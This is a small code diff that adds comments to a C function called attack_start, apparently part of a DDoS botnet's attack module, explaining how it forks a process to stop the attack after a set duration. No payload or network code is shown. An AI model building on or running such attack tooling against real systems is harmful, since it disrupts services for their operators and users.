@@ -157,9 +157,12 @@ void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct 
     int pid1, pid2;
 
     pid1 = fork();
+    // original process returns
     if (pid1 == -1 || pid1 > 0)
         return;
 
+    // create a new process to sleep for duration before killing the process
+    // that is performing the attack
     pid2 = fork();
     if (pid2 == -1)
         exit(0);
